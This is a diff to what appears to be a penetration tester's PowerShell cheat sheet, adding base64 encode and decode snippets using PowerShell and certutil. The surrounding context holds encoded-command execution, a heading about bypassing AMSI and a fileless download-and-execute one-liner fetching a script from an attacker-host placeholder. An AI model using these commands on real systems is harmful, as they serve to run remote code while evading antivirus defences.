@@ -5,6 +5,19 @@
 <VAR>b64 = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
 powershell -enc $b64
 alternative: iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
+alternative: certutil -encode "input.bin" "output.txt"
+
+# base64 decode text
+<VAR>base64 = "SGVsbG8gV29ybGQh"  # Replace with your Base64 string
+<VAR>bytes = [System.Convert]::FromBase64String($base64)
+<VAR>text = [System.Text.Encoding]::UTF8.GetString($bytes)
+Write-Output $text
+
+# base64 decode file
+<VAR>base64 = Get-Content -Path "input.txt" -Raw
+<VAR>bytes = [System.Convert]::FromBase64String($base64)
+[System.IO.File]::WriteAllBytes("output.bin", $bytes)
+alternative: certutil -decode "input.txt" "output.bin"
 
 # fileless import/execute (bypass amsi first)
 IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/<PS1>")
